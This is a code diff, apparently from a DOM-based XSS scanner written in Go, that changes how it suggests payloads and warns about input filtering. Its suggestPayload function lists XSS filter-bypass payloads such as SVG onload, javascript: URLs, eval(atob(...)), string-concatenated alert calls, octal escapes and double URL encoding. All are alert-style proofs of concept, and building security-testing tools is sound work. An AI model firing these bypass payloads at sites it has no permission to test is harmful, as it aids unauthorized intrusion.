@@ -13,7 +13,8 @@ import (
 )
 
 // suggestPayload returns a concrete payload suggestion based on the sink type and filtering
-func suggestPayload(sinkFunc, filterType string) string {
+// Returns: (payload string, isFiltered bool, needsManualVerify bool)
+func suggestPayload(sinkFunc, filterType string) (string, bool, bool) {
 	lower := strings.ToLower(sinkFunc)
 	filterLower := strings.ToLower(filterType)
 
@@ -39,80 +40,80 @@ func suggestPayload(sinkFunc, filterType string) string {
 		}
 	}
 
+	// No filtering detected
+	if filterType == "" {
+		return getBasePayload(func(s string) string { return s }), false, false
+	}
+
 	// 1. Parentheses + backticks filtered → HTML entity bypass
 	if strings.Contains(filterLower, "parentheses") && strings.Contains(filterLower, "backtick") {
 		return getBasePayload(func(s string) string {
 			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "&#40;"), ")", "&#41;")
-		})
+		}), true, false
 	}
 
 	// 2. Only parentheses filtered → backtick bypass
 	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
 		return getBasePayload(func(s string) string {
 			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "`"), ")", "`")
-		})
+		}), true, false
 	}
 
-	// 3. Non-global tag filtering → attribute breakout
-	if strings.Contains(filterLower, "regex strip tags") && !strings.Contains(filterLower, "global") {
-		return `" onmouseover="alert(1)`
+	// 3. Regex strip tags → strong filter, likely blocks most payloads
+	if strings.Contains(filterLower, "regex strip tags") {
+		// Mark as needs manual verification - basic payloads won't work
+		return `<svg/onload=alert(1)>`, true, true
 	}
 
-	// 4. Global tag filtering → try double encoding or alternative vectors
-	if strings.Contains(filterLower, "regex strip tags") && strings.Contains(filterLower, "global") {
-		// Try SVG/MathML vectors that might bypass basic < filtering
-		return `<svg onload=alert(1)>`
-	}
-
-	// 5. HTML special chars filtered → JavaScript protocol
+	// 4. HTML special chars filtered → JavaScript protocol
 	if strings.Contains(filterLower, "html special chars") || strings.Contains(filterLower, "html and parentheses") {
-		return `javascript:alert(1)`
+		return `javascript:alert(1)`, true, false
 	}
 
-	// 6. Alphanumeric whitelist → eval/atob bypass
+	// 5. Alphanumeric whitelist → eval/atob bypass
 	if strings.Contains(filterLower, "whitelist alphanumeric") || strings.Contains(filterLower, "whitelist lowercase") {
-		return `eval(atob('YWxlcnQoMSk='))` // base64 encoded alert(1)
+		return `eval(atob('YWxlcnQoMSk='))`, true, false
 	}
 
-	// 7. Non-word chars filtered → Unicode escape bypass
+	// 6. Non-word chars filtered → Unicode escape bypass
 	if strings.Contains(filterLower, "strip non-word") {
-		return `alert(1)` // Unicode escape for 'a'
+		return `alert(1)`, true, false
 	}
 
-	// 8. Alert/function names filtered → indirect execution
+	// 7. Alert/function names filtered → indirect execution
 	if strings.Contains(filterLower, "strip alert") || strings.Contains(filterLower, "strip eval") {
-		return `window['al'+'ert'](1)` // String concatenation bypass
+		return `window['al'+'ert'](1)`, true, false
 	}
 
-	// 9. Document/window filtered → self-referencing
+	// 8. Document/window filtered → self-referencing
 	if strings.Contains(filterLower, "strip document") || strings.Contains(filterLower, "strip window") {
-		return `this['al'+'ert'](1)` // this refers to window in event handlers
+		return `this['al'+'ert'](1)`, true, false
 	}
 
-	// 10. Hex/unicode escapes filtered → octal or decimal
+	// 9. Hex/unicode escapes filtered → octal or decimal
 	if strings.Contains(filterLower, "strip hex escapes") || strings.Contains(filterLower, "strip unicode escapes") {
-		return `\141lert(1)` // Octal escape for 'a'
+		return `\141lert(1)`, true, false
 	}
 
-	// 11. URL encoding filtered → double URL encoding
+	// 10. URL encoding filtered → double URL encoding
 	if strings.Contains(filterLower, "strip url encoding") {
-		return `%253Cscript%253Ealert(1)%253C/script%253E` // Double URL encoding
+		return `%253Cscript%253Ealert(1)%253C/script%253E`, true, false
 	}
 
-	// 12. Quotes filtered → template literals or no-quote payloads
+	// 11. Quotes filtered → template literals or no-quote payloads
 	if strings.Contains(filterLower, "strip quotes") {
 		return getBasePayload(func(s string) string {
-			return s // Payloads without quotes
-		})
+			return s
+		}), true, false
 	}
 
-	// 13. Digits filtered → no-digit payloads
+	// 12. Digits filtered → no-digit payloads
 	if strings.Contains(filterLower, "strip digits") {
-		return `<img src=x onerror=alert(location)>` // Use location instead of 1
+		return `<img src=x onerror=alert(location)>`, true, false
 	}
 
-	// 14. Standard payloads (no filtering detected)
-	return getBasePayload(func(s string) string { return s })
+	// 13. Other filtering → needs manual verification
+	return getBasePayload(func(s string) string { return s }), true, true
 }
 
 // extractParamName extracts the parameter name from SourceName like "URL helper functions(via xss)"
@@ -177,16 +178,26 @@ func PrintFindings(findings []scanner.Finding, sourceURL string, pageURL ...stri
 		}
 
 		// Show actionable injection details based on source type
-		payload := suggestPayload(f.Sink, f.FilterType)
-		printInjectionDetails(f.Source, payload, targetPage)
+		payload, isFiltered, needsManual := suggestPayload(f.Sink, f.FilterType)
+		printInjectionDetails(f.Source, payload, targetPage, isFiltered, needsManual)
 
 		fmt.Println()
 	}
 }
 
 // printInjectionDetails shows actionable injection information based on the source type
-func printInjectionDetails(source, payload, targetPage string) {
+func printInjectionDetails(source, payload, targetPage string, isFiltered, needsManualVerify bool) {
 	lower := strings.ToLower(source)
+
+	// Show filter warnings
+	if isFiltered {
+		if needsManualVerify {
+			fmt.Printf("    ⚠️  WARNING: Filtering detected - payload may be BLOCKED\n")
+			fmt.Printf("    ⚠️  This finding needs manual verification\n")
+		} else {
+			fmt.Printf("    ⚠️  Filtering detected - using bypass payload\n")
+		}
+	}
 
 	// 1. URL parameter injection (via getUrl, getParameter, etc.)
 	if paramName := extractParamName(source); paramName != "" {
